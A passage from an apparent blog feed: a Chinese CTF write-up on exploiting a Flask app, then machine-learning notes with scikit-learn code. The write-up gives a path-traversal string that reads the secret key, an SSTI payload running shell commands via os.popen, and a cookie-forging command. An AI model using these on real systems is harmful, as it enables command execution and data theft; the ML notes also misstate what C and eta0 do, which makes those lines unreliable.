这里可以理解为判断session的身份码），没有的话就创建这个session[‘n1code’]。</p><p>然后判断session[‘n1code’]是否为空，为空的的话就令 template（模板）为空，不为空的话就赋值 template 为一段实体编码过的HTML模板，并且**把session[‘n1code’]也带入到模板中渲染（渲染的代码会被执行，这里可以设计命令执行代码 )**。</p><p>也就是session中只要有n1code的内容，且不为空，就会被加入template模板中执行。这是只需在其中构造命令执行代码即可。</p><p>template解码后如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">template = &#x27;&#x27;&#x27;&lt;h1&gt;N1 Page&lt;/h1&gt; &lt;div class=&quot;row&gt; &lt;div class=&quot;col-md-6 col-md-offset-3 center&quot;&gt; Hello : %s, why you don&#x27;t look at our &lt;a href=&#x27;/article?name=article&#x27;&gt;article&lt;/a&gt;? &lt;/div&gt; &lt;/div&gt; &#x27;&#x27;&#x27; % session[&#x27;n1code&#x27;]</span><br></pre></td></tr></table></figure><h4 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h4><p><strong>SSTI模板注入</strong></p><p>一般流程为：找到父类&lt;type ‘object’&gt;–&gt;寻找子类–&gt;找关于命令执行或者文件操作的模块。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[\&#x27;os\&#x27;]</span><br></pre></td></tr></table></figure><p>说人话就是通过上面划线的语句，打开python命令执行的模块，这样我们的命令popen(&#39;cat flag.py&#39;).read()才能被执行。</p><p>（os.popen() 方法用于从获取一个命令的输出）。</p><p>因此payload如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#x27;n1code&#x27;: &#x27;&#123;&#123;\&#x27;\&#x27;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[\&#x27;os\&#x27;].popen(\&#x27;cat flag.py\&#x27;).read()&#125;&#125;&#x27;&#125;</span><br></pre></td></tr></table></figure><blockquote><h5 id="python-flask框架中的一些魔术方法"><a href="#python-flask框架中的一些魔术方法" class="headerlink" title="python flask框架中的一些魔术方法"></a>python flask框架中的一些魔术方法</h5><p><code>__class__</code> 返回类型所属的对象</p><p><code>__mro__</code> 返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。</p><p><code>__base__</code> 返回该对象所继承的基类 &#x2F;&#x2F;</p><p><code>__base__</code>和<code>__mro__</code>都是用来寻找基类的 <code>__subclasses__</code> 每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表</p><p><code>__init__</code> 类的初始化方法 <code>__globals__</code> 对包含函数全局变量的字典的引用</p></blockquote><p><strong>加密payload，写入session</strong>：</p><p>还有一个问题是这个payload无法直接写入cookie中的session，因为session还用了key.py进行加密。</p><p>所以查看key.py，得到加密的密钥：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">article?name=../../../proc/self/cwd/key.py</span><br></pre></td></tr></table></figure><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220812151727414.png" alt="image-20220812151727414"></p><p>然后使用工具 <strong>flask_session_cookie_manager3</strong>：</p><p><a href="https://codeload.github.com/noraj/flask-session-cookie-manager/zip/refs/heads/master">https://codeload.github.com/noraj/flask-session-cookie-manager/zip/refs/heads/master</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flask_session_cookie_manager3.py encode -s &quot;Drmhze6EPcv0fN_81Bj-nA&quot; -t &quot;&#123;&#x27;n1code&#x27;: &#x27;&#123;&#123;\&#x27;\&#x27;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[\&#x27;os\&#x27;].popen(\&#x27;cat flag.py\&#x27;).read()&#125;&#125;&#x27;&#125;&quot;</span><br></pre></td></tr></table></figure><p>加密结果为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.eJwdikEKgCAQAL8SXlYvQl2CviKxbGoRmCtZhxD_nnUbZqaI2Ft2XkyiFACNaAPljNjoOBnRDHPDfC-_961IZcb-k3vcr3_cAi8UWjLAGWadOPkowdLVrYE2nR5Q-vTkpKpV1BcrHygP.YZuIBg.eOXIyEYlDww9MHN2rJZpk13froc</span><br></pre></td></tr></table></figure><p>那么这个就是我们的身份码n1code+命令执行语句，作为session被模板渲染后执行，就能读取flag文件</p><h4 id="执行攻击，拿到flag"><a href="#执行攻击，拿到flag" class="headerlink" title="执行攻击，拿到flag"></a>执行攻击，拿到flag</h4><p>最后使用burp开始抓包，填入在cookie的session字段填入构造的payload：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220812152116080.png" alt="image-20220812152116080"></p><p>从回传的网页中得到flag。</p><h4 id="总结步骤-思路"><a href="#总结步骤-思路" class="headerlink" title="总结步骤(思路)"></a>总结步骤(思路)</h4><ol><li><p>利用linux下 &#x2F;porc目录下文件作用查看当前运行进程，得到server.py</p></li><li><p>分析server.py得知存在 key.py 和 flag.py（不可查取） ，且存在SSTI模板注入漏洞</p></li><li><p>构造模板注入语句，并使用flask_session_cookie_manager3.py脚本进行密钥加密</p></li><li><p>burp改包实现session伪造，命令执行。得到flag。</p></li></ol><p><strong>关于SSTI模板注入：</strong></p><p><a href="http://elssm.top/2021/11/29/SSTI%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5/">http://elssm.top/2021/11/29/SSTI%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5/</a></p><p><a href="https://www.freebuf.com/column/187845.html">https://www.freebuf.com/column/187845.html</a></p><p><strong>关于cookie、session、token：</strong></p><p><a href="https://blog.csdn.net/qq_40925189/article/details/107030620">https://blog.csdn.net/qq_40925189/article/details/107030620</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;文件读取&quot;&gt;&lt;a href=&quot;#文件读取&quot; class=&quot;headerlink&quot; title=&quot;文件读取&quot;&gt;&lt;/a&gt;文件读取&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com</summary>
      
    
    
    
    
    <category term="渗透测试" scheme="https://frankcao3.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>机器学习实战</title>
    <link href="https://frankcao3.github.io/posts/61497"/>
    <id>https://frankcao3.github.io/posts/61497</id>
    <published>2022-07-30T04:20:29.000Z</published>
    <updated>2023-10-06T09:09:05.971Z</updated>
    
    <content type="html"><![CDATA[<h1 id="机器学习实战"><a href="#机器学习实战" class="headerlink" title="机器学习实战"></a>机器学习实战</h1><p>参考书目：</p><p>《机器学习实战：基于Scikit-Learn和TensorFlow》</p><p>《机器学习实战》</p><h2 id="先导知识："><a href="#先导知识：" class="headerlink" title="先导知识："></a>先导知识：</h2><ol><li><p><strong>监督学习中，一般使用两种类型的目标变量，标称型和数值型。</strong></p><p>标称型目标变量的结果只在有限目标集中取值，如真与假、动物分类集合{ 爬行类、鱼类、哺乳类、两栖类、植物、真菌}；数值型目标变量则可以从无限的数值集合中取值，如0.100、42.001、1000.743 等。标称型目标变量主要用来分类，数值型目标变量主要用于回归分析。</p></li><li><p><strong>机器学习的主要任务：分类和回归。</strong></p><p>分类是将实例数据划分到合适的分类中，回归主要用于预测数值型数据。分类和回归均属于<strong>监督学习</strong>，即这类算法必须知道样本的类别，即目标变量的分类信息。另外，<strong>无监督学习</strong>则指训练数据没有类别信息，也不会给定目标值。无监督学习可以进行聚类、密度估计（寻找描述数据统计值），也可以减少数据特征的维度，以便使用二维或三维图形来更直观地展示数据信息。</p></li><li><p><strong>如何选择算法：</strong></p><p><em>（1）首先考虑使用算法的目的。</em></p><p>如果是想要知道数据的目标变量的值，可以选择监督学习算法。如果目标变量是离散的，就选择分类器算法；如果目标变量是连续的，就选择回归算法。</p><p>如果不想预测目标变量的值，可以选择无监督学习算法。如果是要将数据划分为离散的组，就选择聚类算法；如果需要估计数据与每个分组的相似程度，则需要使用密度估计算法。</p><p><em>（2）其次需要考虑数据问题。</em></p><p>特征值是离散型变量还是连续型，特征值中是否存在缺失的值，何种原因造成的缺失，数据中是否存在异常值，某个特征发生的频率如何等等。</p></li><li><p><strong>开发机器学习应用程序的步骤：</strong></p><p>（1）收集数据；</p><p>（2）准备输入数据；</p><p>（3）分析输入数据：查看数据中是否存在空值、异常值等，确保没有垃圾数据。</p><p>（4）训练算法；</p><p>（5）测试算法；</p><p>（6）使用算法。</p></li></ol><h2 id="第一章-线性模型"><a href="#第一章-线性模型" class="headerlink" title="第一章 线性模型"></a>第一章 线性模型</h2><h4 id="1-线性回归（回归）"><a href="#1-线性回归（回归）" class="headerlink" title="1. 线性回归（回归）"></a>1. 线性回归（回归）</h4><p>线性模型就是对输入特征加权求和，再加上一个我们称为偏置项（也称为截距项）的常数，以此进行预测。</p><p>由于线性回归模型的梯度下降对特征缩放敏感，所以需要保证所有特征值的大小比例都差不多（比如使用Scikit-Learn的StandardScaler类），否则收敛的时间会长很多。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> LinearRegression</span><br><span class="line"></span><br><span class="line">lin_reg = LinearRegression()</span><br><span class="line">lin_reg.fit(X, y)</span><br><span class="line"><span class="comment"># coef_存放回归系数，intercept_则存放截距</span></span><br><span class="line"><span class="built_in">print</span>(lin_reg.intercept_, lin_reg.coef_)</span><br><span class="line"><span class="built_in">print</span>(lin_reg.predict(X_new))</span><br></pre></td></tr></table></figure><p>其实大多数情况下不会使用纯线性回归，容易过拟合。通常会加上正则化（后面会讲到）。</p><p><u><em><strong>计算复杂度：</strong></em></u></p><p>特征数量比较大（例如100000）时，线性回归的计算将极其缓慢。但是另一方面，对于训练集中的实例数量来说，需要计算的方程是线性的，所以能够有效地处理大量的训练集，只要内存足够。在预测方面，线性回归模型一经训练（不论是标准方程还是梯度下降等其他算法），预测就非常快速：因为计算复杂度相对于想要预测的实例数量和特征数量来说，都是线性的。</p><h4 id="2-梯度下降"><a href="#2-梯度下降" class="headerlink" title="2. 梯度下降"></a>2. 梯度下降</h4><p><u><em><strong>标准方程：</strong></em></u></p><p>求线性模型的最优参数可以通过标准方程直接计算得到，但是涉及计算样本特征矩阵的内积，计算复杂度较高。但是优点是不需要特征缩放，不需要选择学习率以及进行迭代。</p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20210427104257714.png" alt="image-20210427104257714" style="zoom:50%;"><p><u><em><strong>梯度下降：</strong></em></u></p><p>梯度下降是一种非常通用的优化算法，能够为大范围的问题找到最优解。梯度下降的中心思想就是迭代地调整参数从而使成本函数最小化。</p><p>线性回归模型的成本函数恰好是个凸函数，所以在梯度下降时不会陷入局部最优。</p><p>应用梯度下降时，需要保证所有特征值的大小比例都差不多（比如使用Scikit-Learn的StandardScaler类），否则收敛的时间会长很多。</p><p><em><strong>批量梯度下降（BGD）：</strong></em></p><p>基于整个训练数据集对所有需要优化的参数进行同步优化。因此，<u>面对非常庞大的训练集时，算法会变得极慢</u>（不过我们即将看到快得多的梯度下降算法）。但是，梯度下降算法<u>随特征数量扩展的表现比较好</u>：如果要训练的线性模型拥有几十万个特征，使用梯度下降比标准方程要快得多。</p><p><strong>学习率</strong>控制了梯度下降的快慢，学习率太低，算法消耗时间太久，学习率太高，难以稳定到最优参数。要找到合适的学习率，可以使用网格搜索。</p><p>另外，参数优化的迭代次数也要适中，太低可能还未达到最优，太高浪费时间。一个简单的办法是，在开始时设置一个非常大的迭代次数，但是当梯度向量的值变得很微小时中断算法——也就是当它的范数变得低于（称为容差）时，因为这时梯度下降已经（几乎）到达了最小值。</p><p><em><strong>随机梯度下降（SGD）：</strong></em></p><p>批量梯度下降的主要问题是它要用整个训练集来计算每一步的梯度，所以训练集很大时，算法会特别慢。与之相反的极端是随机梯度下降，每一步在训练集中随机选择一个实例，并且仅<u>基于该单个实例来计算梯度</u>。这让算法变得快多了，也可以被用来训练海量的数据集。</p><p>另一方面，由于算法的随机性质，它比批量梯度下降要不规则得多。成本函数将不再是缓缓降低直到抵达最小值，而是不断上上下下，但是从整体来看，还是在慢慢下降。但是即使它到达了最小值，依旧还会持续反弹，永远不会停止。所以算法停下来的参数值肯定是足够好的，但不是最优的。</p><p>随机梯度下降其实可以<u>帮助算法跳出局部最小值</u>，所以相比批量梯度下降，它对找到全局最小值更有优势。因此，随机性的好处在于可以逃离局部最优，但缺点是<u>永远定位不出最小值</u>。要解决这个困境，有一个办法是<u>逐步降低学习率</u>（模拟退火）。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 随机梯度下降，n_iter为迭代次数，penalty为惩罚项（正则化），eta0为迭代次数</span></span><br><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> SGDRegressor</span><br><span class="line">sgd_reg = SGDRegressor(n_iter=<span class="number">50</span>, penalty=<span class="literal">None</span>, eta0=<span class="number">0.1</span>)</span><br><span class="line">sgd_reg.fit(X, y)</span><br><span class="line"><span class="built_in">print</span>(sgd_reg.intercept_, sgd_reg.coef_)</span><br></pre></td></tr></table></figure><p><strong>小批量梯度下降：</strong></p><p>每一步的梯度计算，基于一小部分随机的实例集也就是小批量。相比随机梯度下降，小批量梯度下降的主要优势在于可以从矩阵运算的硬件优化中获得显著的性能提升，特别是需要用到图形处理器时。</p><p>这个算法在参数空间层面的前进过程也不像SGD那样不稳定，特别是批量较大时。所以小批量梯度下降最终会比SGD更接近最小值一些。但是另一方面，它可能更难从局部最小值中逃脱</p><h4 id="3-多项式回归"><a href="#3-多项式回归" class="headerlink" title="3. 多项式回归"></a>3. 多项式回归</h4><p>当数据集并非线性时，可以将每个特征的幂次方添加为一个新特征，在拓展过的特征集上训练线性模型。这种方法被称为多项式回归。</p><p>PolynomialFeatures会在给定的多项式阶数下，添加所有特征组合。例如，有两个特征a和b，阶数degree&#x3D;3，PolynomialFeatures不只会添加特征a2、a3、b2和b3，还会添加组合ab、a2b以及ab2。</p><p>所以要小心特征组合的数量爆炸。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 多项式回归，增加原特征的平方作为新特征</span></span><br><span class="line"><span class="keyword">from</span> sklearn.preprocessing <span class="keyword">import</span> PolynomialFeatures</span><br><span class="line">poly_features = PolynomialFeatures(degree=<span class="number">2</span>, include_bias=<span class="literal">False</span>)</span><br><span class="line">X_poly = poly_features.fit_transform(X)</span><br><span class="line"><span class="comment"># X_poly现在包含原本的特征X和该特征的平方</span></span><br><span class="line">lin_reg = LinearRegression()</span><br><span class="line">lin_reg.fit(X_poly, y)</span><br><span class="line"><span class="built_in">print</span>(lin_reg.intercept_, lin_reg.coef_)</span><br></pre></td></tr></table></figure><p>或者使用管道技术一次完成：、</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">polynomial_regression = Pipeline([(<span class="string">&quot;poly_features&quot;</span>, PolynomialFeatures(degree=<span class="number">2</span>, include_bias=<span class="literal">False</span>)), (<span class="string">&quot;sgd_reg&quot;</span>, LinearRegression())])</span><br><span class="line">polynomial_regression.fit(X, y)</span><br></pre></td></tr></table></figure><h4 id="4-学习曲线"><a href="#4-学习曲线" class="headerlink" title="4. 学习曲线"></a>4. 学习曲线</h4><p>模型训练时会出现欠拟合和过拟合的问题。</p><p>如果无论怎么增大数据集，训练集和测试集的误差接近且较高，那么模型可能欠拟合。这时增大数据集是无效的，需要使用更复杂的模型和寻找更好的特征。</p><p>如果训练集和测试集的误差有一定差距，且在训练集上模型的表现好很多，那么说明模型过拟合了。这时需要增加训练数据，直到测试误差接近训练误差。或者对模型进行正则化。</p><h4 id="5-正则线性模型"><a href="#5-正则线性模型" class="headerlink" title="5. 正则线性模型"></a>5. 正则线性模型</h4><p>减少过度拟合的一个好办法就是对模型正则化（即约束它）：它拥有的自由度越低，就越不容易过度拟合数据。</p><p>比如对于多项式模型来说，正则化可以是降低多项式的阶数。对于线性模型，正则化通常通过约束模型的权重来实现。</p><p><u><em><strong>岭回归（Ridge Regression）：</strong></em></u></p><p>在成本函数中添加一个正则项，使得学习中的算法不仅需要拟合数据，同时还要让模型权重保持最小。</p><p>在执行岭回归之前，必须对数据进行缩放（例如使用StandardScaler），因为它对输入特征的大小非常敏感。大多数正则化模型都是如此。</p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20210427164855903.png" alt="image-20210427164855903" style="zoom:50%;"><p>超参数α控制的是对模型进行正则化的程度。如果α&#x3D;0，则岭回归就是线性模型。如果α非常大，那么所有的权重都将非常接近于零，结果是一条穿过数据平均值的水平线。</p><p>注意，正则项<u>只能在训练的时候添加到成本函数中</u>，一旦训练完成，你需要使用未经正则化的性能指标来评估模型性能。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用标准方程求解的岭回归</span></span><br><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> Ridge</span><br><span class="line">ridge_reg = Ridge(alpha=<span class="number">1</span>, solver=<span class="string">&quot;cholesky&quot;</span>)</span><br><span class="line">ridge_reg.fit(X, y)</span><br><span class="line">ridge_reg.predict([[<span class="number">1.5</span>]])</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用梯度下降的岭回归,正则项为l2表示岭回归</span></span><br><span class="line">sgd_reg = SGDRegressor(penalty=<span class="string">&quot;l2&quot;</span>)</span><br><span class="line">sgd_reg.fit(X, y.ravel())</span><br><span class="line"><span class="built_in">print</span>(sgd_reg.predict([[<span class="number">1.5</span>]]))</span><br></pre></td></tr></table></figure><p>超参数penalty设置的是使用正则项的类型。设为”l2”表示希望SGD在成本函数中添加一个正则项，等于权重向量的l2范数的平方的一半，即岭回归。</p><p><u><em><strong>套索回归（Lasso Regression）：</strong></em></u></p><p>与岭回归一样，它也是向成本函数增加一个正则项，但是它增加的是权重向量的l1范数，而不是l2范数的平方的一半。</p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20210427183920256.png" alt="image-20210427183920256" style="zoom: 33%;"><p>Lasso回归的一个重要特点是它倾向于完全消除掉最不重要特征的权重（也就是将它们设置为零）。也就是说，Lasso回归会自动执行特征选择并输出一个稀疏模型（即只有很少的特征有非零权重）。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用Lasso回归</span></span><br><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> Lasso</span><br><span class="line">lasso_reg = Lasso(alpha=<span class="number">0.1</span>)</span><br><span class="line">lasso_reg.fit(X, y)</span><br><span class="line"><span class="built_in">print</span>(lasso_reg.predict([[<span class="number">1.5</span>]]))</span><br></pre></td></tr></table></figure><p><u><em><strong>弹性网络（Elastic Net）：</strong></em></u></p><p>弹性网络是岭回归与Lasso回归之间的中间地带。其正则项就是岭回归和Lasso回归的正则项的混合，混合比例通过r来控制。当r＝0时，弹性网络即等同于岭回归，而当r＝1时，即相当于Lasso回归。</p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20210427204356724.png" alt="image-20210427204356724" style="zoom:50%;"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用弹性网络</span></span><br><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> ElasticNet</span><br><span class="line">elastic_net = ElasticNet(alpha=<span class="number">0.1</span>, l1_ratio=<span class="number">0.5</span>)</span><br><span class="line">elastic_net.fit(X, y)</span><br><span class="line"><span class="built_in">print</span>(elastic_net.predict([[<span class="number">1.5</span>]]))</span><br></pre></td></tr></table></figure><p><u><em><strong>如何选择正则化模型：</strong></em></u></p><p>模型正则化比不正则化可取。大多数情况下，应该避免使用纯线性回归。</p><p>岭回归是个不错的默认选择，但是如果你觉得实际用到的特征只有少数几个，那就应该更倾向于Lasso回归或是弹性网络，因为它们会将无用特征的权重降为零。</p><p>一般而言，弹性网络优于Lasso回归，因为当特征数量超过训练实例数量，又或者是几个特征强相关时，Lasso回归的表现可能非常不稳定。</p><h4 id="6-逻辑回归（分类）"><a href="#6-逻辑回归（分类）" class="headerlink" title="6. 逻辑回归（分类）"></a>6. 逻辑回归（分类）</h4><p>将数据正则化之后，比如使用StandardScaler类，使用LogisticRegression类进行模型建立。逻辑回归被广泛用于估算一个实例属于某个特定类别的概率。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20210427232532919.png" alt="image-20210427232532919"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> LogisticRegression</span><br><span class="line"></span><br><span class="line">log_reg = LogisticRegression(C=<span class="number">1e5</span>)</span><br><span class="line">log_reg.fit(x_train, y_train)</span><br><span class="line">pre_pro = log_reg.predict_proba(x_test)</span><br></pre></td></tr></table></figure><p>如果你要求它预测出类别（使用predict（）方法而不是predict_proba（）方法），它将返回一个可能性最大的类别。</p><p>与其他线性模型一样，逻辑回归模型可以用l1或l2惩罚函数来正则化。Scikit-Learn默认添加的是l2函数。</p><p>控制Scikit-Learn的LogisticRegression模型正则化程度的超参数不是alpha（其他线性模型使用alpha），而是它的逆反：C，<u>C的值越高，模型正则化程度越高。</u></p><p><u><em><strong>Softmax回归:</strong></em></u></p><p>逻辑回归模型经过推广，可以直接支持多个类别，而不需要训练并组合多个二元分类器（如第3章所述）。这就是Softmax回归。</p><p>原理很简单：对于一个给定的实例x，Softmax回归模型首先计算出每个类别k的分数sk（x），然后对这些分数应用softmax函数（也叫归一化指数），估算出每个类别的概率。跟逻辑回归分类器一样，Softmax回归分类器将估算概率值最高的类别作为预测类别（也就是分数最高的类别）。</p><p>Softmax回归分类器一次只会预测一个类别（也就是说，它是多类别，但是不是多输出），所以它应该仅适用于互斥的类别之上。</p><p>Softmax回归的训练目标是得到一个能对目标类别做出高概率估算的模型（也就是其他类别的概率相应要很低），其成本函数（交叉熵）如下：</p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20210427232025182.png" alt="image-20210427232025182" style="zoom:67%;"><p>当只有两个类别（K&#x3D;2）时，该成本函数等价于逻辑回归的成本函数（log损失函数）。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">softmax_reg = LogisticRegression(multi_class=<span class="string">&quot;multinomial&quot;</span>,solver=<span class="string">&quot;lbfgs&quot;</span>, C=<span class="number">10</span>)</span><br><span class="line">softmax_reg.fit(X, y)</span><br><span class="line">softmax_reg.predict([[<span class="number">5</span>, <span class="number">2</span>]])</span><br></pre></td></tr></table></figure><h2 id="第二章-KNN算法"><a href="#第二章-KNN算法" class="headerlink" title="第二章 KNN算法"></a>第二章 KNN算法</h2><p><strong>优点</strong>：精度高，对异常值不敏感，无数据输入假定。</p><p><strong>缺点</strong>：计算复杂度高、空间复杂度高。</p><p><strong>适用范围</strong>：数值型和标称型。</p><p>对未知类别属性的数据集中的每个点依次执行以下操作：<br>(1)  计算已知类别数据集中的点与当前点之间的距离（欧氏距离）；<br>(2)  按照距离递增次序排序；<br>(3)  选取与当前点距离最小的<strong>k</strong>个点；<br>(4)  确定前<strong>k</strong>个点所在类别的出现频率；<br>(5)  返回前<strong>k</strong>个点出现频率最高的类别作为当前点的预测分类。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.neighbors <span class="keyword">import</span> KNeighborsClassifier</span><br><span class="line">knn = KNeighborsClassifier(n_neighbors=<span class="number">3</span>)</span><br><span class="line"><span class="comment"># 6折交叉验证</span></span><br><span class="line">scores = cross_val_score(knn, x, y, cv=<span class="number">6</span>, scoring=<span class="string">&#x27;accuracy&#x27;</span>)</span><br></pre></td></tr></table></figure><p>当然，KNN也可以用来处理回归任务。返回邻近的K个样本点的标签值的平均数作为预测值。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 处理回归任务</span></span><br><span class="line"><span class="keyword">from</span> sklearn.neighbors <span class="keyword">import</span> KNeighborsRegressor</span><br><span class="line">knn_clf = KNeighborsRegressor(n_neighbors=<span class="number">3</span>)</span><br></pre></td></tr></table></figure><h2 id="第三章-SVM算法"><a href="#第三章-SVM算法" class="headerlink" title="第三章 SVM算法"></a>第三章 SVM算法</h2><p>能够执行线性或非线性分类、回归，甚至是异常值检测任务。它是机器学习领域最受欢迎的模型之一，特别适用于中小型复杂数据集的分类。</p><p><u><em><strong>优点：</strong></em></u></p><ol><li>用于二元和多元分类器、回归和新奇性检测</li><li>良好的预测生成器，提供了鲁棒的过拟合、噪声数据和异常点处理</li><li>当变量比样本还多是依旧有效</li><li>快速，即使样本量大于1万</li><li>自动检测数据的非线性，不用做变量变换</li></ol><p><u><em><strong>缺点：</strong></em></u></p><ol><li>应用在二元分类表现最好，其他预测问题表现不是太好</li><li>变量比样例多很多的时候，有效性降低，需要使用其他方案，例如SGD方案</li><li>只提供预测结果，如果想要获取预测概率，需要额外方法去获取</li><li>如果想要最优结果，需要调参。</li></ol><p><u><em><strong>使用SVM预测模型的通用步骤：</strong></em></u></p><ol><li>选择使用的SVM类</li><li>用数据训练模型</li><li>检查验证误差并作为基准线</li><li>为SVM参数尝试不同的值</li><li>检查验证误差是否改进</li><li>再次使用最优参数的数据来训练模型</li></ol><h4 id="1-线性SVM分类"><a href="#1-线性SVM分类" class="headerlink" title="1. 线性SVM分类"></a>1. 线性SVM分类</h4><p>生成决策边界（实线所示），不仅分离类别，并且尽可能远离最近的训练实例（大间隔分类）。决策边界由最接近边界的训练实例确定（支持），这些实例被称为支持向量（下图中已圈出）。</p><p>可以将SVM分类器视为在类别之间拟合可能的最宽的”街道“（平行的虚线所示）。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20210423214002939.png" alt="image-20210423214002939"></p><p>SVM对<strong>特征缩放</strong>非常敏感，在垂直刻度和水平刻度上生成的决策边界可能存在很大的差异。在左图中，垂直刻度（0<del>90）比水平刻度（0</del>6）大得多，因此可能的决策边界接近于水平。在特征缩放（例如使用Scikit-Learn的StandardScaler）后，决策边界看起来好很多（见右图）。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20210423214542324.png" alt="image-20210423214542324"></p><p><u><em><strong>软间隔分类：</strong></em></u></p><p>如果严格地让所有实例都不在”街道“上，并且位于正确的一边，这就是硬间隔分类。硬间隔分类有2个问题：一个是它只在数据线性可分离时才有效；一个是对异常值特别敏感（会影响泛化能力）。</p><p>为了避免以上问题，灵活地使用模型，我们尽可能在保持街道宽阔和限制间隔违例（即位于街道之上，甚至在错误的一边的实例）之间找到良好的平衡，这就是软间隔分类。在Scikit-Learn的SVM类中，可以通过超参数C来控制这个平衡：C值越小，则街道越宽，但是间隔违例也会越多。</p><p>如果你的SVM模型过度拟合，可以试试通过降低C来进行正则化。</p><p><u><em><strong>SMO算法：</strong></em></u></p><p>在求解SVM的决策边界（求解参数）时，会遇到规模正比于训练样本数量的问题，为了避开这个障碍，使用SMO算法来求解其中的参数。</p><p>SMO的思想：</p><p>每次选择2个变量，然后固定其他变量（参数），然后优化选择的这2个变量，因为每次只优化2个变量，所以非常高效。</p><p><u><em><strong>使用：</strong></em></u></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/20181206003046683.png" alt="img"></p><p><strong>LinearSVC类</strong>适用于<u>样本数量较多</u>的二元和多元分类（大于10000），它会对偏置项进行正则化，所以你需要先减去平均值，使训练集集中（归一化）。如果使用StandardScaler会自动进行这一步。此外，请确保超参数loss设置为”hinge”，因为它不是默认值。最后，为了获得更好的性能，还应该将超参数dual设置为False，除非特征数量比训练实例还多。可以使用管道技术将归一化和实例化算法统一起来。</p><figure class="highlight python"><table><tr><td 